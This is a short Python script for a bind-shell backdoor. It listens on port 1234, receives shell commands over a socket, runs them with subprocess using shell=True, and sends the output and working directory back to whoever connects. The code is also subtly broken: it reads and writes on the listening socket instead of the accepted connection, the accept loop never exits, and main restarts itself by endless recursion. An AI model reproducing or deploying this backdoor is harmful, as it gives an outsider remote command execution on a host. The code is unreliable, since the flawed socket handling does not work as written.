import socket
import time
import subprocess
import os
from queue import Queue


# Create socket
def socket_create():
    try:
        global host 
        global port 
        global s 
        host = ""
        port = 1234
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Bind socket
def socket_bind():
    try:
        global host 
        global port 
        global s
        print ("Binding socket to port: " + str(port) +"\nSheldon>" ,end=" ") 
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()

def socket_connect():
    while 1:
        try:
            s.accept()
            print("Connection accepted.")
        except socket.error as msg:
            print("Socket connect error" + str(msg))
            socket_connect()

def receive_commands():
    while True:
        data = s.recv(2048)
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode("utf-8") == "quit":
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            except:
                output_str = "Command not recognized" + "\n"
                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
    s.close()

def main():
    global s 
    try:
        socket_create()
        socket_bind()
        socket_connect()
        receive_commands()
    except:
        time.sleep(5)
    s.close()
    main()

main()